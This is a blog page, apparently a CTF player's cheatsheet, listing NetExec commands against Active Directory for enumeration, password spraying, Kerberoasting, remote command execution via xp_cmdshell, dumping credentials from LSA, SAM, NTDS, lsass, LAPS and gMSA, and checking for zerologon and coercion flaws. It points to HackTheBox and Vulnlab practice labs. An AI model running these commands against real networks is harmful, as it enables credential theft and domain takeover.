@@ -1,0 +1,246 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="loaf",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NetExec Cheatsheet · serioton</title>
+
+<meta name="description" content="NetExec commands for SMB, LDAP, MSSQL and credential dumping">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NetExec Cheatsheet">
+<meta property="og:url" content="https://seriotonctf.github.io/loaf/CrackMapExec-and-NetExec-Cheat-Sheet/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="NetExec commands for SMB, LDAP, MSSQL and credential dumping">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/crackmapexec-and-netexec-cheat-sheet.png">
+<meta property="article:published_time" content="2024-03-07T14:11:05.000Z">
+<meta property="article:modified_time" content="2025-06-09T16:39:52.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="netexec">
+<meta property="article:tag" content="enumeration">
+<meta property="article:tag" content="credential dumping">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/crackmapexec-and-netexec-cheat-sheet.png">
+<link rel="canonical" href="https://seriotonctf.github.io/CrackMapExec-and-NetExec-Cheat-Sheet/">
+<meta name="theme-color" content="#fbfaf7" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#131214" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/loaf/img/iconcat.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/loaf/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/loaf/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/loaf/css/loaf.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/loaf/">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M3.5 3.5 9 7.6c2-.5 4-.5 6 0l5.5-4.1V14c0 4-3.8 7-8.5 7s-8.5-3-8.5-7Z"/><g fill="var(--bg)"><ellipse cx="8.9" cy="13.6" rx="1.15" ry="1.5"/><ellipse cx="15.1" cy="13.6" rx="1.15" ry="1.5"/></g></svg>
+    <span>serioton</span>
+  </a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/loaf/archives/">archives</a>
+    
+    <a href="/loaf/categories/">categories</a>
+    
+    <a href="/loaf/tags/">tags</a>
+    
+    <a href="/loaf/about/">about</a>
+    
+  </nav>
+  <div class="tools">
+    <details class="tsw"><summary class="icon-btn" aria-label="switch the blog theme" title="theme"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3.5" y="3.5" width="7" height="7" rx="1.5"/><rect x="13.5" y="3.5" width="7" height="7" rx="1.5"/><rect x="3.5" y="13.5" width="7" height="7" rx="1.5"/><rect x="13.5" y="13.5" width="7" height="7" rx="1.5" fill="currentColor"/></svg></summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf" aria-current="true">Loaf</a></div></details>
+    
+    <button class="icon-btn" type="button" data-search aria-label="search" title="search ( / )">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6"/><path d="m15 15 5.5 5.5"/></svg>
+    </button>
+    
+    <button class="icon-btn" type="button" data-theme-toggle aria-label="switch between light and dark" title="lights">
+      <svg class="eye" viewBox="0 0 24 24" aria-hidden="true"><path d="M1.5 12Q12-.5 22.5 12 12 24.5 1.5 12Z" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><ellipse class="pupil" cx="12" cy="12" rx="4.2" ry="4.6" fill="currentColor"/></svg>
+    </button>
+  </div>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+<article class="post">
+  <header class="post-head">
+    <div class="meta">
+      <time datetime="2024-03-07T14:11:05.000Z">2024-03-07</time>
+      <a href="/loaf/categories/cheatsheet/">cheatsheet</a>
+    </div>
+    <h1>NetExec Cheatsheet</h1>
+    <p class="lede">NetExec commands for SMB, LDAP, MSSQL and credential dumping</p>
+    
+    <div class="meta facts">
+      
+      <a href="/loaf/tags/active-directory/" rel="tag">#active directory</a><a href="/loaf/tags/netexec/" rel="tag">#netexec</a><a href="/loaf/tags/enumeration/" rel="tag">#enumeration</a><a href="/loaf/tags/credential-dumping/" rel="tag">#credential dumping</a>
+    </div>
+    
+  </header>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="contents" aria-label="table of contents">
+      <details>
+        <summary>contents</summary>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NetExec-Cheatsheet"><span class="toc-text">NetExec Cheatsheet</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Usage"><span class="toc-text">Basic Usage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication"><span class="toc-text">Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Null-Authentication"><span class="toc-text">Null Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Guest-Authentication"><span class="toc-text">Guest Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Authentication"><span class="toc-text">Local Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Authentication"><span class="toc-text">Kerberos Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Signing"><span class="toc-text">SMB Signing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-Enumeration"><span class="toc-text">Basic Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#List-Shares"><span class="toc-text">List Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#List-Usernames"><span class="toc-text">List Usernames</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spraying"><span class="toc-text">Spraying</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-Specific"><span class="toc-text">Service-Specific</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP"><span class="toc-text">FTP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Dumping"><span class="toc-text">Credential Dumping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secrets-Dump"><span class="toc-text">Secrets Dump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS"><span class="toc-text">NTDS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPAPI"><span class="toc-text">DPAPI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lsass"><span class="toc-text">lsass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAPS"><span class="toc-text">LAPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gMSA"><span class="toc-text">gMSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Group-Policy-Preferences"><span class="toc-text">Group Policy Preferences</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieve-MSOL-account-password"><span class="toc-text">Retrieve MSOL account password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chaining-Arguments"><span class="toc-text">Chaining Arguments</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-text">Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Useful-Modules"><span class="toc-text">Useful Modules</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Webdav"><span class="toc-text">Webdav</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Veeam"><span class="toc-text">Veeam</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slinky"><span class="toc-text">slinky</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#coerce-plus"><span class="toc-text">coerce_plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enum-av"><span class="toc-text">enum_av</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Practice"><span class="toc-text">Practice</span></a></li></ol></li></ol>
+      </details>
+    </nav>
+    
+    
+    <div class="section-filter" hidden>
+      <input type="search" placeholder="filter sections…" autocomplete="off" spellcheck="false" aria-label="filter sections">
+      <span aria-live="polite"></span>
+    </div>
+    
+    <div class="prose">
+      <h1 id="NetExec-Cheatsheet"><a href="#NetExec-Cheatsheet" class="headerlink" title="NetExec Cheatsheet"></a>NetExec Cheatsheet</h1><p>A cheatsheet for NetExec, featuring useful commands and modules for different services</p>
+<ul>
+<li>NetExec: <a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></li>
+<li>Wiki: <a target="_blank" rel="noopener" href="https://www.netexec.wiki/">https://www.netexec.wiki</a></li>
+</ul>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install pipx git</span><br><span class="line">pipx ensurepath</span><br><span class="line">pipx install git+https://github.com/Pennyw0rth/NetExec</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec --version</span><br><span class="line">1.3.0 - NeedForSpeed - a5ec90e4</span><br></pre></td></tr></table></figure>
+<h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec &lt;service&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt;</span><br></pre></td></tr></table></figure>
+<p>Example for SMB:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password</span><br></pre></td></tr></table></figure>
+<h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><h3 id="Null-Authentication"><a href="#Null-Authentication" class="headerlink" title="Null Authentication"></a>Null Authentication</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u &#x27;&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="Guest-Authentication"><a href="#Guest-Authentication" class="headerlink" title="Guest Authentication"></a>Guest Authentication</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u &#x27;guest&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="Local-Authentication"><a href="#Local-Authentication" class="headerlink" title="Local Authentication"></a>Local Authentication</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --local-auth</span><br></pre></td></tr></table></figure>
+<h3 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -k</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target --use-kcache</span><br></pre></td></tr></table></figure>
+<h3 id="SMB-Signing"><a href="#SMB-Signing" class="headerlink" title="SMB Signing"></a>SMB Signing</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target(s) --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Basic-Enumeration"><a href="#Basic-Enumeration" class="headerlink" title="Basic Enumeration"></a>Basic Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target</span><br></pre></td></tr></table></figure>
+<h3 id="List-Shares"><a href="#List-Shares" class="headerlink" title="List Shares"></a>List Shares</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">netexec smb target -u username -p password --shares</span><br></pre></td></tr></table></figure>
+<h3 id="List-Usernames"><a href="#List-Usernames" class="headerlink" title="List Usernames"></a>List Usernames</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u &#x27;&#x27; -p &#x27;&#x27; --users</span><br><span class="line">netexec smb target -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute</span><br><span class="line">netexec smb target -u username -p password --users</span><br></pre></td></tr></table></figure>
+<h3 id="Spraying"><a href="#Spraying" class="headerlink" title="Spraying"></a>Spraying</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u users.txt -p password --continue-on-success</span><br><span class="line">netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ssh target -u username -p password --continue-on-success</span><br></pre></td></tr></table></figure>
+<h2 id="Service-Specific"><a href="#Service-Specific" class="headerlink" title="Service-Specific"></a>Service-Specific</h2><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="All-in-One"><a href="#All-in-One" class="headerlink" title="All-in-One"></a>All-in-One</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol</span><br></pre></td></tr></table></figure>
+<h4 id="Extracting-Files"><a href="#Extracting-Files" class="headerlink" title="Extracting Files"></a>Extracting Files</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -k --get-file target_file output_file --share sharename</span><br></pre></td></tr></table></figure>
+<h4 id="Spider-plus-Module"><a href="#Spider-plus-Module" class="headerlink" title="Spider_plus Module"></a>Spider_plus Module</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M spider_plus</span><br><span class="line">netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false</span><br></pre></td></tr></table></figure>
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u &#x27;&#x27; -p &#x27;&#x27; --users</span><br></pre></td></tr></table></figure>
+<h4 id="All-in-One-1"><a href="#All-in-One-1" class="headerlink" title="All-in-One"></a>All-in-One</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups</span><br></pre></td></tr></table></figure>
+<h4 id="Kerberoasting-amp-ASREProast"><a href="#Kerberoasting-amp-ASREProast" class="headerlink" title="Kerberoasting &amp; ASREProast"></a>Kerberoasting &amp; ASREProast</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password --kerberoasting hash.txt</span><br><span class="line">netexec ldap target -u username -p password --asreproast hash.txt</span><br></pre></td></tr></table></figure>
+<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all</span><br></pre></td></tr></table></figure>
+<h4 id="LDAP-signing"><a href="#LDAP-signing" class="headerlink" title="LDAP signing"></a>LDAP signing</h4><p>Checks whether LDAP signing and binding are required and&#x2F;or enforced</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password -M ldap-checker</span><br></pre></td></tr></table></figure>
+<h4 id="ADCS-Enumeration"><a href="#ADCS-Enumeration" class="headerlink" title="ADCS Enumeration"></a>ADCS Enumeration</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+<h4 id="MachineAccountQuota"><a href="#MachineAccountQuota" class="headerlink" title="MachineAccountQuota"></a>MachineAccountQuota</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password -M maq</span><br></pre></td></tr></table></figure>
+<h4 id="Pre-Created-Computer-Accounts"><a href="#Pre-Created-Computer-Accounts" class="headerlink" title="Pre-Created Computer Accounts"></a>Pre-Created Computer Accounts</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password -M pre2k</span><br></pre></td></tr></table></figure>
+<h4 id="Find-Misconfigured-Delegation"><a href="#Find-Misconfigured-Delegation" class="headerlink" title="Find Misconfigured Delegation"></a>Find Misconfigured Delegation</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password --find-delegation</span><br></pre></td></tr></table></figure>
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><h4 id="Authentication-1"><a href="#Authentication-1" class="headerlink" title="Authentication"></a>Authentication</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec mssql target -u username -p password</span><br></pre></td></tr></table></figure>
+<h4 id="Executing-Commands-via-xp-cmdshell"><a href="#Executing-Commands-via-xp-cmdshell" class="headerlink" title="Executing Commands via xp_cmdshell"></a>Executing Commands via xp_cmdshell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec mssql target -u username -p password -x command_to_execute</span><br></pre></td></tr></table></figure>
+<h4 id="Extracting-Files-1"><a href="#Extracting-Files-1" class="headerlink" title="Extracting Files"></a>Extracting Files</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec mssql target -u username -p password --get-file output_file target_file</span><br></pre></td></tr></table></figure>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h4 id="List-Files-amp-Directories"><a href="#List-Files-amp-Directories" class="headerlink" title="List Files &amp; Directories"></a>List Files &amp; Directories</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ftp target -u username -p password --ls</span><br><span class="line">netexec ftp target -u username -p password --ls folder_name</span><br></pre></td></tr></table></figure>
+<h4 id="Retrieve-a-File"><a href="#Retrieve-a-File" class="headerlink" title="Retrieve a File"></a>Retrieve a File</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ftp target -u username -p password --ls folder_name --get file_name</span><br></pre></td></tr></table></figure>
+<h2 id="Credential-Dumping"><a href="#Credential-Dumping" class="headerlink" title="Credential Dumping"></a>Credential Dumping</h2><h3 id="Secrets-Dump"><a href="#Secrets-Dump" class="headerlink" title="Secrets Dump"></a>Secrets Dump</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --lsa</span><br><span class="line">netexec smb target -u username -p password --sam</span><br></pre></td></tr></table></figure>
+<h3 id="NTDS"><a href="#NTDS" class="headerlink" title="NTDS"></a>NTDS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --ntds</span><br><span class="line">netexec smb target -u username -p password -M ntdsutil</span><br></pre></td></tr></table></figure>
+<h3 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --dpapi</span><br></pre></td></tr></table></figure>
+<h3 id="lsass"><a href="#lsass" class="headerlink" title="lsass"></a>lsass</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M lsassy</span><br></pre></td></tr></table></figure>
+<h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --laps</span><br></pre></td></tr></table></figure>
+<h3 id="gMSA"><a href="#gMSA" class="headerlink" title="gMSA"></a>gMSA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec ldap target -u username -p password --gmsa</span><br><span class="line">netexec ldap target -u username -p password --gmsa-convert-id id</span><br><span class="line">netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account</span><br></pre></td></tr></table></figure>
+<h3 id="Group-Policy-Preferences"><a href="#Group-Policy-Preferences" class="headerlink" title="Group Policy Preferences"></a>Group Policy Preferences</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M gpp_password</span><br></pre></td></tr></table></figure>
+<h3 id="Retrieve-MSOL-account-password"><a href="#Retrieve-MSOL-account-password" class="headerlink" title="Retrieve MSOL account password"></a>Retrieve MSOL account password</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M msol</span><br></pre></td></tr></table></figure>
+<h3 id="Chaining-Arguments"><a href="#Chaining-Arguments" class="headerlink" title="Chaining Arguments"></a>Chaining Arguments</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password --sam --lsa --dpapi</span><br></pre></td></tr></table></figure>
+<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><p>Check if the DC is vulnerable to zerologon, petitpotam, nopac</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M zerologon</span><br><span class="line">netexec smb target -u username -p password -M petitpotam</span><br><span class="line">netexec smb target -u username -p password -M nopac</span><br></pre></td></tr></table></figure>
+<h2 id="Useful-Modules"><a href="#Useful-Modules" class="headerlink" title="Useful Modules"></a>Useful Modules</h2><h3 id="Webdav"><a href="#Webdav" class="headerlink" title="Webdav"></a>Webdav</h3><p>Checks whether the WebClient service is running on the target</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M webdav </span><br></pre></td></tr></table></figure>
+<h3 id="Veeam"><a href="#Veeam" class="headerlink" title="Veeam"></a>Veeam</h3><p>Extracts credentials from local Veeam SQL Database</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M veeam</span><br></pre></td></tr></table></figure>
+<h3 id="slinky"><a href="#slinky" class="headerlink" title="slinky"></a>slinky</h3><p>Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M slinky </span><br></pre></td></tr></table></figure>
+<h3 id="coerce-plus"><a href="#coerce-plus" class="headerlink" title="coerce_plus"></a>coerce_plus</h3><p>Check if the Target is vulnerable to any coerce vulns (PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip</span><br></pre></td></tr></table></figure>
+<h3 id="enum-av"><a href="#enum-av" class="headerlink" title="enum_av"></a>enum_av</h3><p>Gathers information on all endpoint protection solutions installed on the the remote host</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netexec smb target -u username -p password -M enum_av</span><br></pre></td></tr></table></figure>
+<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.netexec.wiki/">https://www.netexec.wiki/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.rayanle.cat/lehack-2024-netexec-workshop-writeup/">https://www.rayanle.cat/lehack-2024-netexec-workshop-writeup/</a></li>
+</ul>
+<h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><ul>
+<li>Mist (HackTheBox)</li>
+<li>Rebound (HackTheBox)</li>
+<li>Vintage (HackTheBox)</li>
+<li>Cicada (HackTheBox)</li>
+<li>Baby (Vulnlab)</li>
+<li>Intercept (Vulnlab)</li>
+<li>Reflection (Vulnlab)</li>
+<li>NetExec Lab (<a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec-Lab">https://github.com/Pennyw0rth/NetExec-Lab</a>)</li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <section class="related">
+      <h2 class="year">related</h2>
+      <ul class="list">
+        
+        <li><time datetime="2025-10-20T14:01:50.000Z">2025-10-20</time><a href="/loaf/AKTIVKATALOG-1-Hack-lu-CTF-2025/">AKTIVKATALOG 1 - Hack.lu CTF 2025</a></li>
+        
+        <li><time datetime="2025-02-15T13:54:52.000Z">2025-02-15</time><a href="/loaf/HTB-Solving-Cicada-Using-Only-NetExec/">HTB: Solving Cicada Using Only NetExec</a></li>
+        
+        <li><time datetime="2024-12-01T20:16:14.000Z">2024-12-01</time><a href="/loaf/BloodyAD-Cheatsheet/">BloodyAD Cheatsheet</a></li>
+        
+      </ul>
+    </section>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/loaf/Lock-Vulnlab/" rel="next"><small>← older</small>Lock - Vulnlab</a>
+      <a class="newer" href="/loaf/Sendai-Vulnlab/" rel="prev"><small>newer →</small>Sendai - Vulnlab</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  <div class="site-footer-inner">
+    <a class="perch" href="#" aria-label="back to top" title="back to top"><svg class="cat" viewBox="0 0 72 36" aria-hidden="true">
+  <path class="cat-tail" d="M11 32.5C4.5 33 2.4 28.5 3 22.5" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round"/>
+  <g fill="currentColor">
+    <path d="M9 36c-3.5 0-4.5-3-3.5-7 2-9.5 11-15 24-15h18c10 0 16 6 16 15v7Z"/>
+    <path d="M40.8 15.5 42.5 3.5l8.5 6.5ZM54.5 9.5l8-6 1.5 12Z"/>
+    <ellipse cx="52.3" cy="18.5" rx="12" ry="10.3"/>
+  </g>
+  <g class="cat-asleep" fill="none" stroke="var(--bg)" stroke-width="1.3" stroke-linecap="round">
+    <path d="M45.3 18.8q2.1 1.9 4.2 0M55.3 18.8q2.1 1.9 4.2 0"/>
+  </g>
+  <g class="cat-awake" fill="var(--bg)">
+    <ellipse cx="47.4" cy="18.6" rx="1.7" ry="2.1"/><ellipse cx="57.4" cy="18.6" rx="1.7" ry="2.1"/>
+  </g>
+  <path d="M51.3 22.3h2.2l-1.1 1.2Z" fill="#e58aa5"/>
+</svg>
+</a>
+    
+    <span>© 2023–2026 serioton</span>
+    <a href="/loaf/atom.xml">rss</a>
+  </div>
+</footer>
+
+
+<dialog class="search" data-index="/loaf/search.xml" aria-label="search">
+  <input type="search" placeholder="search posts…" autocomplete="off" spellcheck="false" aria-label="search posts">
+  <ol class="search-results"></ol>
+  <p class="search-note">type to search · ↑↓ to move · esc to close</p>
+</dialog>
+
+<script src="/loaf/js/loaf.js" defer></script>
